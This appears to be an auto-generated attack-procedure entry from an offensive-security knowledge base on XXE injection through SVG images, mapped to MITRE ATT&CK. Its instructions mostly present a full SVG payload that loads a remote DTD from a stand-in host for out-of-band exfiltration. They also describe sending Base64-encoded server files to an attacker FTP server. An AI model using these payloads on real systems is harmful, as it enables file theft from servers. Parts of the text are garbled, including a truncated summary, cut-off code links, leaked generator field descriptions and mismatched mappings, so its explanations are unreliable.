---
id: 25da68fb-d920-4621-9b25-0e5e543759d7
name: XXE Injection via SVG Image
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:44.565164+00:00'
updated_at: '2023-04-10T20:24:37.930762+00:00'
tactics:
- '[[Discovery|TA0007 - Discovery]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]'
- '[[Network Share Discovery|T1135 - Network Share Discovery]]'
tags:
- '[[XML External Entity]]'
- '[[XXE in exotic files]]'
- '[[XXE inside SVG]]'
commands:
- '[[List Files in Directory]]'
- '[[XXE via SVG rasterization]]'
---

# XXE Injection via SVG Image

## Summary

XXE Injection via SVG Image is an attack that leverages the ability to include external entities in XML documents. By injecting malicious code into an SVG image, an attacker can execute arbitrary code on the target system. This technique can be used for discovery, collection, and exfiltration of se

## Description

# Description

XXE Injection via SVG Image is an attack that leverages the ability to include external entities in XML documents. By injecting malicious code into an SVG image, an attacker can execute arbitrary code on the target system. This technique can be used for discovery, collection, and exfiltration of sensitive information. When a victim opens the SVG image, the malicious code is executed and can be used to retrieve system information, execute commands, or exfiltrate data. This attack can be particularly effective when targeting systems that process SVG images on a regular basis, such as web servers or graphic design applications.

 

## Requirements

1. Access to the target system

1. Ability to inject malicious code into an SVG image

 

## Defense

1. Ensure that all input validation and sanitization is performed on any user-supplied data that is used to generate XML documents

1. Implement a Content Security Policy (CSP) that restricts the types of files that can be loaded by the browser

1. Monitor network traffic for any suspicious activity, such as attempts to exfiltrate data or connect to external services

 

## Objectives

1. Retrieve system information

1. Execute commands on the target system

1. Exfiltrate sensitive data

 

# Instructions

1. Use this command to list files in the current directory using an SVG image.

 



**Code**: [[<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlin]]



> This command uses an SVG image to list files in the current directory. The image is created using the data URI scheme and the 'expect' protocol. The 'ls' command is passed as an argument to the 'expect' protocol, which lists the files in the current directory. This command can be used to quickly list files without having to switch to the command line.



**Command** ([[List Files in Directory]]):

```bash
ls
```



2. This command retrieves the hostname of the target system using XXE injection. The attacker injects an external entity reference in the XML input which references the hostname file of the target system. When the XML is parsed, the entity reference is replaced with the contents of the hostname file, which is then reflected in the output.

 



**Code**: [[<?xml version="1.0" standalone="yes"?>
<!DOCTYPE t]]



> The attacker can use this technique to retrieve sensitive information such as passwords, private keys, and other files that can be accessed by the application's user. This attack can be prevented by disabling the resolution of external entities or by using a secure parser that does not resolve external entities.

3. This command is used to exploit XML External Entity (XXE) vulnerability via SVG rasterization. The vulnerability is exploited by including an external entity in the DOCTYPE declaration of the SVG file. When the file is rasterized, the external entity is fetched by the server, resulting in an Out-of-Band (OOB) request. The OOB request can be used to exfiltrate data from the server or perform other malicious activities.

 



**Code**: [[<?xml version="1.0" standalone="yes"?>
<!DOCTYPE s]]



> The 'data' field contains the SVG file with the external entity included in the DOCTYPE declaration. The 'lang' field specifies the language of the command, which is XML. The 'text' field provides a brief description of the vulnerability being exploited. The 'instruction' field provides instructions on how to use the command. The 'explain' field provides a detailed explanation of the vulnerability and how it is being exploited.



**Command** ([[XXE via SVG rasterization]]):

```bash
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```



4. Inject the provided XML file containing the XXE payload into the target application. This will cause the application to read the contents of the /etc/hostname file and encode it in Base64 format. The encoded data will then be sent to the attacker-controlled FTP server at ftp://example.org:2121.

 



**Code**: [[<!ENTITY % data SYSTEM "php://filter/convert.base6]]



> The provided XML file contains an XML External Entity (XXE) injection payload. When this file is injected into the target application, the XXE payload will cause the application to read the contents of the /etc/hostname file and include it in the response. The contents of the /etc/hostname file will be encoded in Base64 format and sent to the attacker-controlled FTP server at ftp://example.org:2121. The attacker can then decode the data and retrieve the hostname of the target system.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery|TA0007 - Discovery]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]
- [[Network Share Discovery|T1135 - Network Share Discovery]]

## Commands Used

- [[List Files in Directory]]
- [[XXE via SVG rasterization]]

## Tags

- [[XML External Entity]]
- [[XXE in exotic files]]
- [[XXE inside SVG]]


